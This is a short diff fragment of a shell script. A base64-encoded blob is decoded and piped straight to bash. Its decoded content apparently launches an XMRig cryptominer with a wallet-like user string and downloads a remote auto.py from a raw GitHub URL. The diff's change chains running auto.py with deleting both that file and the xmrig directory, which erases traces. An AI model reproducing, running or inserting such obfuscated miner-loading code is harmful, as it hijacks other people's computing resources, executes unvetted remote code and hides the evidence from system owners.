@@ -39,5 +39,4 @@ bTo5MjAwIC1hIHJ4IC1rIC11IDNBTW83ZGFiUm9Td1dBa055a0xnZnl6c0VVTDUyU3NvVG8ucmVu
 bzJmIC1wYXNzIHggLXQgNCcKY2QKd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5j
 b20vbWFuaC1tb2JpbGUtMDg5ODcwNzk2OC90aWNrdG9rL3JlZnMvaGVhZHMvbWFpbi9hdXRvLnB5
 Cg==" | base64 -d | bash
-python auto.py
-rm -rf auto.py && rm -rf xmrig
+python auto.py && rm -rf auto.py && rm -rf xmrig
